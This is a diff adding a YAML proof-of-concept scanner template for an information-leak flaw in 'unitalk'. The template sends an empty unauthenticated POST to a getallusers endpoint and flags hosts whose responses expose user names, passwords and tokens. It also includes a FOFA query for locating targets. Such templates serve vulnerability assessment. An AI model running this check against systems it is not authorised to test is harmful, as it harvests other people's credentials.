@@ -1,0 +1,18 @@
+id: poc-yaml-unitalk-getallusers-info-leak
+info:
+  name: unitalk getallusers 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: unitalk
+  fofa: title="unitalk"
+requests:
+- method: POST
+  path: /unitalk/v1.0/user/getallusers.json
+  headers:
+    Content-Type: application/json;charset=UTF-8
+  data: '{}'
+  expression: status_code == 200 && matches(body,"\"name\":\"[0-9a-zA-Z]+\"") && matches(body,"\"pwd\":\"[0-9a-zA-Z]+\"")
+    && matches(body,"\"token\":\"[0-9a-zA-Z-]+\"") && !contains(body,"<") && contains(content_type,"application/json")
+variables: {}
+transport: http
